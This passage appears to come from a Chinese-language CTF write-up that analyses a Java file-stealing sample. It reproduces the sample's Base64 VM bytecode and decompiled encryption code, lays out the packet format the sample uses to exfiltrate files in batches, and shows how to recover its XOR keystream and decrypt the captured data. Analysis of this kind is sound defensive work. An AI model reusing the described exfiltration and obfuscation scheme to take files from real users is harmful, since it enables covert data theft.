AACdAAAADDUAAACeAAAAnAAAEAAzAAAAn4TavyQAAACeNQAAAKCE2r8kAAAQADMAAAChAAAAnAAAAKA1AAAAogAAAJ0AABAAMwAAAKMAAACihNq/JDMAAACkAAAAnQAAAKA0AAAApQAAAJ8AAAChNAAAAKYAAACjAAAApDUAAACnAAAApQAAAKY1AAAAqAAAAJwAAACdUAAAAKkAAACnAAAABwAAABBhAAAAqgAAABliAAAAqQAAAKpiTwDgNQAAAB8C///u0GEAAACrAAAAFWEAAACsAAAAq1EAAACtAAAArAAAAAUAAAAHYQAAAK4AAAAWYQAAAK8AAACuMAAAALAAAACtAAAAr2EAAACxAAAAF2EAAACyAAAAsVEAAACzAAAAsgAAAAUAAAAHNQAAALQAAACzAAAQADUAAAC1AAAAsAAAEAA1AAAAtjRT31cAABAAMwAAALcAAAC0NFPfVzMAAAC4AAAAswAAALYzAAAAuQAAALU0U99XMwAAALoAAACwAAAAtjQAAAC7AAAAtwAAALg0AAAAvAAAALkAAAC6NQAAAL0AAAC7AAAAvDQAAAC+AAAAtAAAALU1AAAAvwAAAL4AABAANAAAAMA0U99XAAAAtjMAAADBAAAAvwAAAMA0AAAAwgAAAL0AAADBNAAAAMMAAACzAAAAsFAAAADEAAAAwgAAAAcAAAAFYQAAAMUAAAAXYgAAAMQAAADFYknn798AAAAfAv//7tBhAAAAxgAAABZhAAAAxwAAAMZiAAAAxwAAAAtiuF5vjAAAAB8C///u0GEAAADIAAAACxEAAADJ/////wAAAMgRAAAAyv/////////+EAAAAMsAAADJAAAAyhEAAADM/////wAAAMsQAAAAzQAAAMj////+YgAAAMwAAAAKYgQLR8gAAAAfAv//7tBhAAAAzgAAABZhAAAAzwAAAApiAAAAzwAAAM5iIneJDQAAAB8C///u0GLhV97kAAAAHwL//+7QYQAAANAAAAAcYQAAANEAAADQYgAAANEAAAAJYtvZ4ysAAAAfAv//7tBhAAAA0gAAABhhAAAA0wAAANJhAAAA1AAAAAljAAAA1QAAANQAAAABAAAA02EAAADWAAAA1VEAAADXAAAA1gAAAAUAAAAHYQAAANgAAAAXYQAAANkAAADYUQAAANoAAADZAAAABQAAAAc1AAAA2wAAANcAABAAMwAAANwAAADaAAAA2zUAAADdAAAA2gAAEAAzAAAA3gAAANcAAADdNAAAAN8AAADcAAAA3jUAAADgAAAA1wAAANpQAAAA4QAAAN8AAAAHAAAABWIAAADhAAAACGKCEDS1AAAAHwL//+7QYQAAAOIAAAAaYQAAAOMAAADiYQAAAOQAAAAYYQAAAOUAAADkYwAAAOYAAADjAAAAAQAAAOViAAAA5gAAAAdirhs6JQAAAB8C///u0GEAAADnAAAACGEAAADoAAAAB2IAAADnAAAA6GJXTRQ4AAAAHwL//+7QYQAAAOkAAAAYYQAAAOoAAADpYgAAAOoAAAAGYqp1HPcAAAAfAv//7tBhAAAA6wAAAAYRAAAA7P////8AAADrEQAAAO3//////////hAAAADuAAAA7AAAAO0RAAAA7/////8AAADuEAAAAPAAAADr/////mIAAADvAAAABWKD3k+/AAAAHwL//+7QYQAAAPEAAAAYYQAAAPIAAAAFYgAAAPIAAADxYu3d/JYAAAAfAv//7tBi2pqfEAAAAB8C///u0AH/////Av///v4=";
    }
    return Runner.encrypt(decoder.decode(vmInstructions), content, key);
  } catch (Exception exception0) {
    exception0.printStackTrace();
    if (content != null && content.length != 0) {
      byte[] arr_b2 = new byte[content.length];
      for (int v1 = 0; v1 < content.length; ++v1) {
        arr_b2[v1] = (byte) (content[v1] ^ key[v1 % key.length]);
      }
      return arr_b2;
    }
    return new byte[0];
  }
}
```

```java title="Runner.java"
public static byte[] encrypt(byte[] instrcutions, byte[] content, byte[] key) {
  VM vm = new VM();
  vm.m1(false);
  byte[] encrypted = new byte[content.length];
  HashMap<Integer, AggregateValue> memory = new HashMap<>();
  ArrayList<IntValue> content_ = new ArrayList<>();
  for (int v1 = 0; v1 < content.length; ++v1) {
    int v2 = content[v1];
    content_.add(new IntValue(IntType.ofBits(8), ((long) (v2 & 0xFF))));
  }

  memory.put(0, new AggregateValue(ArrayType.arrayOf(IntType.ofBits(8), content.length), content_));
  ArrayList<IntValue> key_ = new ArrayList<>();
  for (int v3 = 0; v3 < key.length; ++v3) {
    int v4 = key[v3];
    key_.add(new IntValue(IntType.ofBits(8), ((long) (v4 & 0xFF))));
  }

  memory.put(1, new AggregateValue(ArrayType.arrayOf(IntType.ofBits(8), key.length), key_));
  ArrayList<IntValue> result_ = new ArrayList<>();
  for (int v5 = 0; v5 < content.length; ++v5) {
    result_.add(new IntValue(IntType.ofBits(8), 0L));
  }

  memory.put(2, new AggregateValue(ArrayType.arrayOf(IntType.ofBits(8), content.length), result_));
  VmValue[] arr_access400 = { new PointerValue(PointerType.ptrTo(IntType.ofBits(8)), 1),
          new IntValue(IntType.ofBits(0x40), ((long) key.length)),
          new PointerValue(PointerType.ptrTo(IntType.ofBits(8)), 0),
          new IntValue(IntType.ofBits(0x40), ((long) content.length)),
          new PointerValue(PointerType.ptrTo(IntType.ofBits(8)), 2) };
  try {
    vm.m8(instrcutions, arr_access400, memory);
    VmValue result = (VmValue) memory.get(2);
    if (result instanceof AggregateValue) {
      for (int v = 0; v < ((AggregateValue) result).size(); ++v) {
        VmValue access4001 = ((AggregateValue) result).get(v);
        if (access4001 instanceof IntValue) {
          encrypted[v] = (byte) ((IntValue) access4001).getBigInt().intValue();
        }
      }
    }

    return encrypted;
  } catch (Exception exception0) {
    throw new RuntimeException("failed: " + exception0.getMessage(), exception0);
  }
}
```

我来简要复述一遍逻辑：

### 传输策略
+ 分批传输：每读取3个文件就封装成一个数据包进行发送。

### 数据包结构
Payload是一个纯二进制流。

| 字段 | 长度 | 说明 |
| :--- | :--- | :--- |
| PAYLOAD_MAGIC | 4字节 | `"\x89ali"` |
| Index | 4字节 | 当前批次的编号 |
| EncKey Length | 4字节 | 后面RSA加密后的会话密钥长度 |
| Encrypted Session Key | 动态 | 使用RSA公钥加密后的8字节随机密钥 |
| File Count | 4字节 | 本批次包含的文件数量 |
| File Table Item 1..N | 动态 | 包含：路径长度(int) + XOR混淆后的路径 + 偏移量(int) |
| Encrypted Body | 动态 | 经过LZRR压缩后再经过VM加密的所有文件合并内容 |

### 加密与安全

+ 路径混淆：文件路径在写入索引表前，每个字节都会与 `0xE9` 进行 XOR 运算。
+ RSA：内置了RSA公钥用于加密每批次随机生成的8字节Session Key。
+ 自定义虚拟机：
  - 内置了两个虚拟指令集`algo2`和`algo3`。
  - `index`为偶数的时候用`algo2`，否则用`algo3`。
+ 如果VM执行失败，降级使用简单的XOR循环加密。

# 分析VM

可见，上述协议中，我们未知的部分只有一个：自定义虚拟机（`Loader.vmEncrypt`）。我们当然可以打开`VM.java`逐字节分析每一个虚拟机的指令。不过，有一个更聪明的方法：`Loader.vmEncrypt(content, key, index)`是一个没有副作用的纯函数，我们可以直接把它当成一个黑盒，先简单分析它的性质，如果没有结果，再细看虚拟机的指令也不迟。

- `Loader.vmEncrypt(content, key, index)`：
  - `index%2==0` -> 选择 Base64 “algo2”
  - `index%2==1` -> 选择 Base64 “algo3”
  - 最后调用：`Runner.encrypt(decoder.decode(vmInstructions), content, key)`
- `Runner.encrypt(instr, content, key)`：
  - 构造一个虚拟机
  - 把3个数组放到虚拟机的堆里：
    - `content`数组（`u8[]`）
    - `key`数组（`u8[]`）
    - `result`数组（`u8[]`，初始全0）
  - 传5个参数给虚拟机执行：`(ptr key, key_len, ptr content, content_len, ptr result)`
  - 虚拟机跑完后读回`result`字节作为加密输出

现在就可以大胆猜想了：是不是异或流加密？~~毕竟这也是CTF经典选材了~~

## 猜想：异或流

假设加密函数满足：
$$
E(x) = x \oplus keystream
$$
那么：
$$
\forall x, E(x) \oplus E(0) = x
$$

我们来简单地检验一下：`jshell --class-path build`
```java
import java.lang.reflect.*;
import i.l.Loader;
int len=128;
byte[] content1=new byte[len];
byte[] content2=new byte[len];
for (int i=0; i<128; ++i) content2[i]=(byte)i;
byte[] key=new byte[]{1,2,3,4,5,6,7,8};
Method m=Loader.class.getDeclaredMethod("vmEncrypt", byte[].class, byte[].class, int.class);
m.setAccessible(true);
byte[] out1=(byte[])m.invoke(null, content1, key, 1);
byte[] out2=(byte[])m.invoke(null, content2, key, 1);
for (int i=0; i<128; ++i) System.out.printf("%02x", out1[i] ^ out2[i]);
// Output: 000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f303132333435363738393a3b3c3d3e3f404142434445464748494a4b4c4d4e4f505152535455565758595a5b5c5d5e5f606162636465666768696a6b6c6d6e6f707172737475767778797a7b7c7d7e7f
```
我们还可以换几组数组再次尝试。不过结果都是正确的，因此，我们可以假设：这是一个异或流加密算法。

## 求解`KeyStream`
`KeyStream`是否依赖`key`？是否依赖`index`？经过和上文相似的`jshell`测试，我们得到如下结论：
+ 只按奇偶选择`algo2`/`algo3`；`index`的具体值不参与加密。
+ 奇数分支，更换不同的`key`，加密结果相同，因此是常量流。
+ 偶数分支，更换`key`输出会变。

因此，我们可以直接得到奇数分支的`KeyStream`，至于偶数分支，我们慢慢来：

我们知道明文的前8个字节一定是`LZRR\x02\x01\x00\x0d`或者`LZRR\x02\x01\x00\x0f`（LZRR 头），因此，我们可以得到`KeyStream`的前8个字节。现在只需要用这前8个字节得到`key`，就能够完成解包。

现在我们来使用~~生命科学里经常使用的~~控制变量法，把`key`视作8个变量，调整`key`观察`KeyStream`的变化。

`key = [0, 0, 0, 0, 0, 0, 0, 0]`时`KeyStream[0..7] = [0, 0, 0, 0, 0, 0, 0, 0x3c]`

然后，分别令`key`为正交单位向量，得到8个`KeyStream`，观察可以发现，相邻两个`KeyStream`的异或非零字节非常少，并且所有非零字节都是`0x01`。观察一下，我们可以写出方程：
```python
KeyStream[7] = 0x3c   xor key[7]
KeyStream[6] = key[6] xor key[7]
KeyStream[5] = key[5] xor key[6]
KeyStream[4] = key[4] xor key[5]
KeyStream[3] = key[3] xor key[4]
KeyStream[2] = key[2] xor key[3]
KeyStream[1] = key[1] xor key[2]
KeyStream[0] = key[0] xor key[1]
```
那求解`key`也就简单了。

# 答案

![flag]

<!-- 引用 -->

[download]: /assets/ctf/thief.zip "题目下载"
[deobf]: https://github.com/narumii/Deobfuscator/ "Jar反混淆"

[jeb-ugly]: jeb-ugly.png "JEB反编译结果"
[no-goto]: no-goto.png "去除goto" 
[flag]: flag.png "flag" 